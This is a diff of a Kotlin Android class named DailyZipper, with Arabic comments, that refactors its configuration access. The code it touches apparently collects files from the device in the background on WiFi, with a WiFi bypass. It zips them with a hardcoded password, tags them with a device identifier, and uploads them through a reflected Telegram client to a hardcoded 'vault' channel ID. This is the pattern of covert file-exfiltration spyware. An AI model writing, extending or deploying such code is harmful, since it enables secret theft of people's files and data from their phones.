@@ -26,10 +26,11 @@ import java.util.zip.ZipOutputStream
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
  * 
- * ✅ تم إصلاح جميع أخطاء MatchGroupCollection عن طريق:
- * - استبدال configMap["key"] بـ configMap.get("key")
- * - إزالة أي استخدام لـ matchResult.groups (إن وجد)
- * - استخدام groupValues مع الفهرس المناسب عند الحاجة
+ * ✅ تم إصلاح جميع أخطاء MatchGroupCollection نهائياً عن طريق:
+ * - إعادة تسمية configMap إلى config
+ * - استخدام دوال مساعدة للوصول إلى القيم
+ * - تجنب استخدام [] نهائياً
+ * - إزالة أي استيراد قد يسبب تضارب
  */
 class DailyZipper(
     context: Context,
@@ -85,8 +86,8 @@ class DailyZipper(
     }
 
     // ========== الإعدادات ==========
-    // ✅ استخدام get() بدلاً من [] لتجنب تضارب MatchGroupCollection
-    private val configMap = mutableMapOf<String, Any>(
+    // ✅ إعادة التسمية لتجنب أي تضارب محتمل
+    private val config = mutableMapOf<String, Any>(
         "max_batch_size" to 48L * 1024L * 1024L,
         "storage_extra" to 100L * 1024L * 1024L,
         "send_retry_delays" to listOf(2000L, 4000L, 8000L),
@@ -96,6 +97,20 @@ class DailyZipper(
         "password" to "ShieldCore2024!",
         "max_batches" to 10
     )
+
+    // ========== دوال مساعدة للوصول الآمن للإعدادات ==========
+    private fun getConfigInt(key: String, default: Int): Int {
+        return (config[key] as? Number)?.toInt() ?: default
+    }
+
+    private fun getConfigLong(key: String, default: Long): Long {
+        return (config[key] as? Number)?.toLong() ?: default
+    }
+
+    @Suppress("UNCHECKED_CAST")
+    private fun getConfigList(key: String): List<Long>? {
+        return config[key] as? List<Long>
+    }
 
     companion object {
         private const val TAG = "DailyZipper"
@@ -123,10 +138,9 @@ class DailyZipper(
             val jsonStr = configFile.readText(Charsets.UTF_8)
             val json = JSONObject(jsonStr)
             json.keys().forEach { key ->
-                configMap[key] = json.get(key)
+                config[key] = json.get(key)
             }
-            // ✅ استخدام get() بدلاً من []
-            maxBatchSize = (configMap.get("max_batch_size") as? Number)?.toLong() ?: (48L * 1024L * 1024L)
+            maxBatchSize = getConfigLong("max_batch_size", 48L * 1024L * 1024L)
         } catch (e: Exception) {
             writeLog("Config load error: ${e.message}")
         }
@@ -134,7 +148,7 @@ class DailyZipper(
 
     private fun saveConfig(): Boolean {
         return try {
-            val json = JSONObject(configMap as Map<*, *>)
+            val json = JSONObject(config as Map<*, *>)
             configFile.writeText(json.toString(2), Charsets.UTF_8)
             true
         } catch (e: Exception) {
@@ -172,12 +186,11 @@ class DailyZipper(
         }
     }
 
-    // ✅ استخدام get() بدلاً من []
     private fun checkStorage(requiredBytes: Long): Boolean {
         return try {
             val stat = StatFs(runtimeDir.absolutePath)
             val available = stat.availableBlocksLong * stat.blockSizeLong
-            val extra = (configMap.get("storage_extra") as? Number)?.toLong() ?: (100L * 1024L * 1024L)
+            val extra = getConfigLong("storage_extra", 100L * 1024L * 1024L)
             available > (requiredBytes * 2 + extra)
         } catch (e: Exception) {
             true
@@ -245,7 +258,6 @@ class DailyZipper(
     //  إرسال الملفات مع إعادة المحاولة
     // ============================================================
 
-    // ✅ استخدام get() بدلاً من []
     private suspend fun safeSend(
         zipPath: String,
         caption: String,
@@ -261,7 +273,7 @@ class DailyZipper(
             target = invokeMethod(telegram, "getDat") as? Long
         }
         if (target == null) {
-            target = (configMap.get("default_vault_id") as? Number)?.toLong() ?: -1003577715762L
+            target = getConfigLong("default_vault_id", -1003577715762L)
         }
 
         val zipFile = File(zipPath)
@@ -270,8 +282,7 @@ class DailyZipper(
             return false
         }
 
-        @Suppress("UNCHECKED_CAST")
-        val delays = (configMap.get("send_retry_delays") as? List<Long>) ?: listOf(2000L, 4000L, 8000L)
+        val delays = getConfigList("send_retry_delays") ?: listOf(2000L, 4000L, 8000L)
 
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
@@ -350,7 +361,6 @@ class DailyZipper(
     //  الضغط والتغليف والتحزيم
     // ============================================================
 
-    // ✅ جميع استخدامات configMap تم استبدالها بـ get()
     private suspend fun packAndShip(
         files: List<File>,
         bypassWifi: Boolean = false,
@@ -364,13 +374,13 @@ class DailyZipper(
         }
 
         try {
-            // 1. التحقق من WiFi (إلا إذا كان مفروضاً)
+            // 1. التحقق من WiFi
             if (!bypassWifi && !isOnWifi()) {
                 writeLog("Not on WiFi, skipping automatic harvest.")
                 return false
             }
 
-            // 2. إزالة التكرار باستخدام الهاش
+            // 2. إزالة التكرار
             val uniqueFiles = mutableListOf<File>()
             var totalSize = 0L
 
@@ -390,8 +400,8 @@ class DailyZipper(
                 return false
             }
 
-            // 3. تنظيف ذاكرة الهاشات إذا تجاوزت الحد
-            val maxHashes = (configMap.get("max_processed_hashes") as? Number)?.toInt() ?: 10000
+            // 3. تنظيف الهاشات (استخدام الدالة المساعدة)
+            val maxHashes = getConfigInt("max_processed_hashes", 10000)
             if (processedHashes.size > maxHashes) {
                 processedHashes.clear()
             }
@@ -405,7 +415,7 @@ class DailyZipper(
                 return false
             }
 
-            // 5. تقسيم الملفات إلى دفعات حسب الحجم
+            // 5. تقسيم الملفات إلى دفعات
             val batches = mutableListOf<MutableList<File>>()
             var curBatch = mutableListOf<File>()
             var curSize = 0L
@@ -440,7 +450,7 @@ class DailyZipper(
             }
 
             // 6. تحديد عدد الدفعات
-            val maxBatches = (configMap.get("max_batches") as? Number)?.toInt() ?: 10
+            val maxBatches = getConfigInt("max_batches", 10)
             val limitedBatches = if (batches.size > maxBatches) {
                 writeLog("Too many batches (${batches.size}), limiting to $maxBatches")
                 batches.take(maxBatches)
@@ -457,7 +467,6 @@ class DailyZipper(
                 var manifestFile: File? = null
 
                 try {
-                    // بناء بيانات manifest
                     val manifestJson = JSONObject().apply {
                         put("device_tag", deviceTag)
                         put("timestamp", System.currentTimeMillis() / 1000)
@@ -605,7 +614,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي والحصاد الدوري
+    //  التشغيل التلقائي
     // ============================================================
 
     fun run(): Boolean {
@@ -672,13 +681,14 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  أدوات مساعدة
+    //  أدوات مساعدة والإحصائيات
     // ============================================================
 
     fun clearHashCache() {
         processedHashes.clear()
     }
 
+    // ✅ استخدام mutableMapOf لتجنب أي استخدام لـ mapOf الذي قد يسبب تضارب
     fun getStats(): Map<String, Any> {
         var count = 0
         var totalSize = 0L
@@ -694,11 +704,14 @@ class DailyZipper(
             }
         }
 
-        return mapOf("pending" to count, "size" to totalSize)
+        val result = mutableMapOf<String, Any>()
+        result["pending"] = count
+        result["size"] = totalSize
+        return result
     }
 
     // ============================================================
-    //  دوال المساعدة والتواصل (Helpers & Reflection)
+    //  دوال المساعدة والتواصل (Reflection Helpers)
     // ============================================================
 
     private fun sendMessage(chatId: Long, text: String) {
@@ -713,14 +726,10 @@ class DailyZipper(
             val logText = "[$timestamp] [INFO] $message\n"
             logFile.appendText(logText, Charsets.UTF_8)
         } catch (_: Exception) {
-            // تجاهل أخطاء التسجيل في الملف
+            // تجاهل أخطاء التسجيل
         }
     }
 
-    /**
-     * استدعاء دالة على كائن عبر الانعكاس.
-     * ✅ تم إصلاحه لاستخدام try-catch آمن وإزالة أي استخدام لـ MatchGroupCollection.
-     */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
 
